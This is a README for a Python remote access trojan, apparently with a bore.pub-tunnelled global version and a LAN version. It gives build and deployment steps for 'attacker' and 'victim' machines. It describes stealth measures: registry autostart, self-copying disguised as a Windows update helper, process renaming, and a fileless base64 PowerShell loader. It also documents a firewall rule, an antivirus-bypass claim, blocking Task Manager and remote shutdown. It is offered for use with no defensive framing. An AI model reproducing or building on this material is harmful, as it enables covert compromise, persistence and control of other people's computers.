# Remote Control Tool (global version)

A Python-based remote control RAT that tunnels through [bore.pub](https://github.com/ekzhang/bore) — no VPS, no relay, no manual IP/port passing.

## How It Works

```
Attacker                          bore.pub                    Victim
┌──────────────┐    bore tunnel   ┌──────────┐    auto-scan   ┌──────────────┐
│  client.exe  │◄────────────────►│ :65535   │◄──────────────►│  server.exe  │
│  Flask web   │    ─────────     │  ...     │   scan + AUTH  │  screenshots │
│  UI :5000    │    bore.exe      │ :65000   │                │  cmd exec    │
└──────────────┘                  └──────────┘                └──────────────┘
       │                              │
  Bundles bore.exe              Port 65523
  Claims free port              (found by scan)
```

1. **Client** — bundles `bore.exe`, claims a free port on bore.pub (65535→65000)
2. **Victim** — scans bore.pub ports 65535→65000, connects to open port, sends AUTH handshake
3. **Tunnel established** — attacker sees victim screen in browser, sends commands

## Files

| File | Description |
|------|-------------|
| `webclient.py` | Client source — attacker machine |
| `client.exe` | Compiled client (14 MB, includes bore.exe) |
| `serveranydusk.py` | Server source — victim machine |
| `server.exe` | Compiled server (94 MB, no console) |
| `bore.exe` | bore tunnel binary (v0.6.0) |

## Requirements

### Victim (Server)

```
pip install pyautogui pynput psutil
```

### Attacker (Client)

No Python needed — compiled EXE bundles everything including bore.exe.

## Building

```bash
# Client (bundles bore.exe)
pyinstaller --onefile --name client --add-binary "bore.exe;." webclient.py

# Server (no console)
pyinstaller --onefile --noconsole --name server serveranydusk.py
```

## Usage

### Method 1: Compiled EXE (recommended)

1. Run `client.exe` on attacker machine
2. Run `server.exe` on victim machine
3. Server automatically scans bore.pub, finds client, connects (~5–15 sec)
4. Browser opens with live screen view at `http://localhost:5000`

### Method 2: Direct Python

```bash
# Attacker
python webclient.py --auto

# Victim
python serveranydusk.py
```

## Features

| Feature | Description |
|---------|-------------|
| Remote desktop | Live stream in browser (JPEG, 25% quality) |
| Mouse control | Move, click, drag via web UI or commands |
| Keyboard input | Type text, press special keys |
| Open URL | `open https://...` on victim |
| Lock/Unlock | Lock or unlock victim screen |
| Reverse mouse | Invert X-axis for trolling |
| Auto move | Random mouse movement |
| Auto click | Click spam with interval/duration |
| Task Manager block | `block_taskmgr` |
| Fake error/virus | Popup pranks |
| Error spam | Endless error popups (toggle) |
| Rick roll | Opens Rick Astley in browser |
| Shutdown | Shuts down victim |

## Web UI Commands

Type commands in the text box on the web page:

- `move 100 50` — move mouse by offset
- `click_at 500 300` — click at position
- `click left` / `click right`
- `type Hello, world!`
- `key enter` / `key tab`
- `special_key ctrl` / `special_key alt`
- `open https://youtu.be/dQw4w9WgXcQ`
- `lock_screen` / `unlock`
- `autoclick 0.1 5` — click every 0.1s for 5s
- `exit` — disconnect

## Stealth

- **Autostart** — adds to `HKCU\...\Run\WindowsUpdateHelper`
- **Console hidden** — compiled `--noconsole`
- **Self-copy** — copies to `%LOCALAPPDATA%\Microsoft\Windows\Caches\WindowsUpdateHelper.exe`

## Technical Details

- **Tunnel**: bore.pub (free, no account needed)
- **Port range**: 65535→65000 (high ports, rarely occupied)
- **Auth**: SECRET handshake (`AUTH <secret>\n` / `AUTH_OK`)
- **Screen**: PIL `pyautogui.screenshot()` → JPEG → 4-byte length prefix
- **Scan**: `ThreadPoolExecutor(20)` — 536 ports in ~8 seconds worst case
- **No VPS, no relay, no manual config**

---

# LAN Remote Control Tool (local version)

A Python-based LAN remote control tool with stealth delivery via PowerShell loader.

## Files

| File | Description |
|------|-------------|
| `serveranydusk(local).py` | Server source — runs on victim machine |
| `webclient(local).py` | Client source — runs on attacker machine |
| `server.ps1` | PowerShell loader — launches server without .py on disk |
| `server.cmd` | Hidden launcher for server.ps1 |

## Requirements

### Victim (Server)

Python 3.12 with packages (auto-installed by loader if missing):

- `numpy`
- `opencv-python-headless`
- `pyautogui`
- `keyboard`
- `pynput`
- `psutil`
- `mss`

### Attacker (Client)

Python 3.x — no external dependencies (stdlib only).

## Usage

### Method 1: Direct Python

```bash
# On victim
python serveranydusk(local).py

# On attacker
python webclient(local).py
```

### Method 2: Stealth Loader (no .py on disk)

Copy `server.ps1` + `server.cmd` to victim, double-click `server.cmd`.

The loader:
1. Embeds server code as base64 inside `server.ps1`
2. Finds or downloads Python embeddable to `%LOCALAPPDATA%\Python312\wupsvc.exe`
3. Runs `wupsvc.exe -c "exec(base64.b64decode(os.environ['PYLOAD']))"`
4. Code lives only in memory — nothing on disk

## Server Commands

| Feature | Command |
|---------|---------|
| Remote desktop | Automatic on connect |
| Move mouse | `move <dx> <dy>` |
| Left/right click | `click left` / `click right` |
| Click at position | `click_at <x> <y>` |
| Type text | `type <text>` |
| Press key | `key <keyname>` |
| Special keys | `special_key ctrl/shift/alt/enter/esc/space/tab` |
| Open URL | `open <url>` |
| Reverse mouse | `reverse_mouse` |
| Auto move | `automove [speed]` |
| Auto click | `autoclick [interval] [duration]` |
| Lock screen | `lock_screen` |
| Unlock screen | `unlock` |
| Block Task Manager | `block_taskmgr` |
| Fake virus popup | `fake_virus` |
| Fake error popup | `fake_error` |
| Error spam (toggle) | `error_spam` |
| Rick roll | `rick` |
| Shutdown | `shutdown` |
| Disconnect | `exit` |

## Stealth

- **Self-install** → `%LOCALAPPDATA%\Microsoft\Windows\Caches\WindowsUpdateHelper.exe` (hidden + system)
- **Autostart** → `HKCU\...\Run\WindowsUpdateHelper`
- **Process rename** → `python.exe` → `wupsvc.exe` (Task Manager shows "wupsvc")
- **Mutex** → `Global\WindowsUpdateSvc` (single instance)
- **Console hidden** → `ShowWindow(GetConsoleWindow(), 0)`
- **No .py on disk** → code in `$env:PYLOAD` base64, executed via `-c`
- **Firewall** → attempts `netsh` rule for TCP 65432 + UDP 45631

## Network

- **TCP** `0.0.0.0:65432` — C2 channel
- **UDP** `255.255.255.255:45631` — auto-discovery (server broadcasts `ip:65432` every 2s)
- **Screen** → mss capture → JPEG 40% → 4-byte length prefix + compressed data

## Anti-Detection

- **Kaspersky** detects compiled C loaders — PowerShell approach bypasses (no binary, just base64 in env var)

## Architecture

```
Attacker                          Victim
┌──────────────────┐             ┌──────────────────┐
│ webclient(local)  │◄───TCP────►│ server(local).py  │
│  stdin → cmds     │  65432     │  screen → stream  │
│  display ← screen │            │  cmds → action    │
└──────────────────┘             └──────────────────┘
                                        │
                                   UDP broadcast
                                   255.255.255.255:45631
                                        │
                                  Auto-discovery
```
